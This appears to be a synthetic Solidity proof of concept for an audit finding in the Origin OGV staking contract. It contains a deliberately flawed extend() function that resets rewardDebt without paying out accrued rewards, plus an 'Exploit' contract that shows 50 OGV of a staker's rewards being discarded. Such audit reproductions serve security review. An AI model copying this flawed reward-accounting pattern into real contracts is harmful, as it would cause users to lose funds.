// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Origin OGV staking — extend() rewrites rewardDebt without paying
    (OpenZeppelin, finding 10564).
    SYNTHETIC, cheatcode-free. Alice and Bob each stake 100 OGV. 100 OGV of
    rewards accrue. Alice's collect updates accRewardPerShare and pays her 50.
    Bob's extend snaps rewardDebt to the new gross and his 50 is discarded.
    The control calls _collectRewards before updating the debt and pays the 50. */

contract Ogv {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract RewardsSource {
    Ogv public ogv;
    uint256 public pending;

    constructor(Ogv _ogv) {
        ogv = _ogv;
    }

    function fund(uint256 amount) external {
        ogv.transferFrom(msg.sender, address(this), amount);
        pending += amount;
    }

    function previewRewards() external view returns (uint256) {
        return pending;
    }

    function collectRewards() external returns (uint256 amount) {
        amount = pending;
        pending = 0;
        ogv.transfer(msg.sender, amount);
    }
}

contract OgvStaking {
    struct Lockup {
        uint256 amount;
        uint128 end;
        uint256 points;
    }

    Ogv public ogv;
    RewardsSource public rewardsSource;
    uint256 public epoch;
    uint256 public accRewardPerShare;
    uint256 public totalSupply;
    mapping(address => uint256) internal _points;
    mapping(address => uint256) public rewardDebt;
    mapping(address => Lockup[]) public lockups;

    constructor(Ogv _ogv, RewardsSource _source) {
        ogv = _ogv;
        rewardsSource = _source;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _points[account];
    }

    function _mint(address to, uint256 points) internal {
        totalSupply += points;
        _points[to] += points;
    }

    function previewPoints(uint256 amount, uint256 duration) public view returns (uint256, uint256) {
        require(duration >= 7 days, "Staking: Too short");
        require(duration <= 1461 days, "Staking: Too long");
        uint256 start = block.timestamp > epoch ? block.timestamp : epoch;
        uint256 end = start + duration;
        return (amount, end);
    }

    function stake(uint256 amount, uint256 duration) external {
        ogv.transferFrom(msg.sender, address(this), amount);
        (uint256 points, uint256 end) = previewPoints(amount, duration);
        lockups[msg.sender].push(Lockup(amount, uint128(end), points));
        _mint(msg.sender, points);
        rewardDebt[msg.sender] = (balanceOf(msg.sender) * accRewardPerShare) / 1e12;
    }

    function extend(uint256 lockupId, uint256 duration) external {
        Lockup memory lockup = lockups[msg.sender][lockupId];
        uint256 oldAmount = lockup.amount;
        uint256 oldEnd = lockup.end;
        uint256 oldPoints = lockup.points;
        (uint256 newPoints, uint256 newEnd) = previewPoints(oldAmount, duration);
        require(newEnd > oldEnd, "New lockup must be longer");
        lockup.end = uint128(newEnd);
        lockup.points = newPoints;
        lockups[msg.sender][lockupId] = lockup;
        _mint(msg.sender, newPoints - oldPoints);
        // @> VULN: rewardDebt is updated here with no prior _collectRewards, so the outstanding rewards are discarded
        rewardDebt[msg.sender] = (balanceOf(msg.sender) * accRewardPerShare) / 1e12;
    }

    function collectRewards() external {
        _collectRewards(msg.sender);
        rewardDebt[msg.sender] = (balanceOf(msg.sender) * accRewardPerShare) / 1e12;
    }

    function previewRewards(address user) external view returns (uint256) {
        uint256 supply = totalSupply;
        if (supply == 0) return 0;
        uint256 acc = accRewardPerShare;
        acc += (rewardsSource.previewRewards() * 1e12) / supply;
        uint256 gross = (balanceOf(user) * acc) / 1e12;
        return gross - rewardDebt[user];
    }

    function _collectRewards(address user) internal {
        uint256 supply = totalSupply;
        if (supply == 0) return;
        accRewardPerShare += (rewardsSource.collectRewards() * 1e12) / supply;
        uint256 balance = balanceOf(user);
        if (balance == 0) return;
        uint256 grossReward = (balance * accRewardPerShare) / 1e12;
        uint256 netReward = grossReward - rewardDebt[user];
        ogv.transfer(user, netReward);
    }
}

contract Alice {
    OgvStaking public staking;

    constructor(OgvStaking _staking) {
        staking = _staking;
    }

    function stake(uint256 amount, uint256 duration) external {
        staking.stake(amount, duration);
    }

    function collect() external {
        staking.collectRewards();
    }
}

contract Exploit {
    uint256 public constant LOST = 50 ether;

    Ogv public ogv;
    RewardsSource public source;
    OgvStaking public staking;
    Alice public alice;

    constructor() {
        ogv = new Ogv();
        source = new RewardsSource(ogv);
        staking = new OgvStaking(ogv, source);
        alice = new Alice(staking);
        ogv.mint(address(this), 100 ether);
        staking.stake(100 ether, 7 days);
        ogv.mint(address(alice), 100 ether);
        alice.stake(100 ether, 7 days);
    }

    function run() external {
        uint256 beforeBal = ogv.balanceOf(address(staking));
        ogv.mint(address(this), 100 ether);
        source.fund(100 ether);
        alice.collect();
        uint256 owed = staking.previewRewards(address(this));
        require(owed == LOST, "bob is owed 50");
        staking.extend(0, 14 days);
        require(staking.previewRewards(address(this)) == 0, "rewards wiped");
        staking.collectRewards();
        require(ogv.balanceOf(address(this)) == 0, "bob was paid nothing");
        require(ogv.balanceOf(address(staking)) - beforeBal == LOST, "50 left stranded");
    }
}
